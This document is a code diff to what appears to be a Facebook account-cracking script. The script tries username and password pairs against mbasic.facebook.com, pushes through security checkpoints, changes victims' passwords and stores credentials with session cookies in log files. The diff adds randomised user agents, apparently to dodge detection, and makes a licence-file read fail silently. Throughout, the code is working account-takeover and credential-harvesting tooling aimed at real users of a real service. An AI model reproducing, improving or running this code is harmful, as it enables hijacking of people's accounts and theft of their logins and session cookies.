@@ -663,7 +663,10 @@ def menu(my_name, my_id):
     os.system("clear")
     banner()
     followdong()
-    key = open(".license","r").read()
+    try:
+	    key = open(".license","r").read()
+    except:
+	    key = "-"
     negara = requests.get("http://ip-api.com/json/").json()["country"]
     ip = requests.get("http://ip-api.com/json/").json()["query"]
     prints(Panel(f"{P2}{negara}", padding=(0, 22), width=60, style=f"{color_panel}"))
@@ -2279,11 +2282,16 @@ def opsi():
 data = {}
 data2 = {}
 
+def kontolll():
+ rr = random.randint
+ rc = random.choice
+ konton = f"Mozilla/5.0 (Linux; Android 11; {str(rr(3,9))}.{str(rr(0,1))}.1; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
+ return random.choice([konton])
 
 def mengecek(user, pw):
     global loop, ubah_pass, pwbaru
     session = requests.Session()
-    ua = "Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
+    ua = kontolll()
     url = "https://mbasic.facebook.com"
     session.headers.update(
         {
@@ -2372,47 +2380,41 @@ def mengecek(user, pw):
                             "\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"
                             % (H, til, N, H, user, pwbaru[0], coki)
                         )
-                        open("OK/OK-%s.txt" % (day), "a").write(
-                            "%s%s|%s|%s\n" % (H, user, pwbaru[0], coki)
+                        open("OK/OK-%s.txt"%(day), "a").write(
+                            "%s%s|%s|%s\n"%(H, user, pwbaru[0], coki)
                         )
                 else:
-                    print(
-                        "\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"
-                        % (H, til)
-                    )
+                    print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H, til))
                     tree = Tree(" ", guide_style=f"{color_ok}")
                     tree.add(
-                        Panel(f"{ua}", width=83, padding=(0, 2), style=f"{color_ok}")
+                        Panel(f"{ua}", width=60, style=f"{color_ok}")
                     )
                     prints(tree)
-                    open("OK/OK-%s.txt" % (day), "a").write(
-                        "%s %s|%s|%s\n" % (H, user, pw, coki)
+                    open("OK/OK-%s.txt"%(day), "a").write(
+                        "%s %s|%s|%s\n"%(H, user, pw, coki)
                     )
-            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall(
-                "\<title>(.*?)<\/title>", str(response)
-            ):
+            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>", str(response)):
                 print(
-                    Panel("\r%s \033[0m akun terpasang autentikasi dua faktor			" % (M))
+                    Panel("\r %s \033[0m akun terpasang autentikasi dua faktor			"%(M))
                 )
             else:
-                print("%s%s\033[0mterjadi kesalahan" % (M, til))
+                print("%s%s\033[0mterjadi kesalahan"%(M, til))
         else:
             if "c_user" in session.cookies.get_dict():
-                print("\r%s%s akun tidak checkpoint, silahkan anda login " % (H))
-                open("OK/OK-%s.txt" % (day), "a").write("%s%s|%s\n" % (H, user, pw))
+                print("\r%s akun tidak checkpoint, silahkan anda login "%(H))
+                open("OK/OK-%s.txt"%(day), "a").write("%s%s|%s\n"%(H, user, pw))
         for opsi in range(len(cek)):
             number += 1
-            jalan("  %s%s. %s%s" % (P, str(number), K, cek[opsi]))
+            jalan("  %s%s. %s%s"%(P, str(number), K, cek[opsi]))
     elif "login_error" in str(response):
         oh = response.find("div", {"id": "login_error"}).find("div").text
-        print("%s %s" % (M, oh))
+        print("%s %s"%(M, oh))
     else:
         tree = Tree(" ", guide_style=f"bold white")
         tree.add(
             Panel(
                 f"{P2}login gagal, silahkan cek kembali id dan kata sandi",
-                width=83,
-                padding=(0, 2),
+                width=60,
                 style=f"{color_panel}",
             )
         )
